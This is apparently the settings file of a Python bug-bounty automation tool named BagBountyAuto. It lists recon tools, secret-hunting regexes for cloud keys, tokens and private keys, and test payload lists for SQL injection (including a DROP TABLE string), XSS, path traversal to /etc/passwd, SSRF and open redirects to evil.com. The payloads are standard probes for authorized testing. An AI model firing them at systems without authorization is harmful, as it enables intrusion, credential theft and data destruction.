#!/usr/bin/env python3
"""
Настройки BagBountyAuto
"""

import os

# Настройки инструментов
TOOLS = {
    'subfinder': 'subfinder',
    'httpx': 'httpx',
    'waybackurls': 'waybackurls',
    'katana': 'katana',
    'nuclei': 'nuclei',
    'sqlmap': 'sqlmap',
    'trufflehog': 'trufflehog',
    'grep': 'grep',
    'sed': 'sed',
    'wget': 'wget',
    'curl': 'curl'
}

# Настройки сканирования
PORTS = "80,443,8080,8000,8888"
THREADS = 200
KATANA_DEPTH = 5
BLACKLIST_EXT = "woff,css,png,svg,jpg,woff2,jpeg,gif"
SENSITIVE_EXT = r"\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5)$"

# Паттерны для поиска секретов
SECRET_PATTERNS = {
    'api_key': r'["\']?[a-zA-Z0-9_-]{32,45}["\']?',
    'aws_key': r'AKIA[0-9A-Z]{16}',
    'aws_secret': r'[0-9a-zA-Z/+]{40}',
    'github_token': r'ghp_[a-zA-Z0-9]{36}',
    'google_api': r'AIza[0-9A-Za-z\-_]{35}',
    'firebase': r'AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}',
    'slack_token': r'xox[baprs]-([0-9a-zA-Z]{10,48})',
    'private_key': r'-----BEGIN PRIVATE KEY-----',
    'ssh_key': r'-----BEGIN OPENSSH PRIVATE KEY-----',
    'database_url': r'(mysql|postgresql|mongodb)://[^\s]+',
    'jwt_token': r'eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*',
    'password': r'["\']password["\']\s*[:=]\s*["\'][^"\']+["\']',
    'secret': r'["\']secret["\']\s*[:=]\s*["\'][^"\']+["\']',
    'token': r'["\']token["\']\s*[:=]\s*["\'][^"\']+["\']'
}

# Payloads для тестирования
PAYLOADS = {
    'sqli': [
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "'; DROP TABLE users--",
        "' OR '1'='1",
        "admin'--"
    ],
    'xss': [
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<img src=x onerror=alert('XSS')>",
        "'\"><script>alert('XSS')</script>",
        "<svg onload=alert('XSS')>"
    ],
    'lfi': [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "/etc/passwd",
        "C:\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd"
    ],
    'ssrf': [
        "http://localhost",
        "http://127.0.0.1",
        "http://0.0.0.0",
        "http://[::1]",
        "file:///etc/passwd"
    ],
    'open_redirect': [
        "https://evil.com",
        "//evil.com",
        "javascript:alert('redirect')",
        "data:text/html,<script>alert('redirect')</script>",
        "http://localhost:8080"
    ]
}

# Настройки отчетов
REPORT_TEMPLATE = """
# Отчет BagBountyAuto: {domain}

**Дата:** {timestamp}
**Время выполнения:** {duration}

## Статистика
- Поддомены: {subdomains_count}
- Живые хосты: {alive_count}
- URL: {urls_count}
- Чувствительные файлы: {sensitive_count}

## Результаты
{results}

## Рекомендации
{recommendations}
"""

# Настройки организации отчетов
REPORTS_CONFIG = {
    'base_dir': os.getenv('BAGBOUNTY_REPORTS_DIR', 'reports'),  # Базовая папка для отчетов
    'max_age_days': 30,  # Максимальный возраст отчетов в днях
    'cleanup_enabled': True,  # Включить автоматическую очистку
    'organize_by_date': True,  # Организовать по дате
    'organize_by_domain': True,  # Организовать по домену
}

# Структура папок для отчетов
REPORTS_STRUCTURE = {
    'recon': 'recon_reports',
    'analysis': 'analysis_reports', 
    'vuln_scan': 'vuln_scan_reports',
    'filtered': 'filtered_reports',
    'logs': 'logs'
} 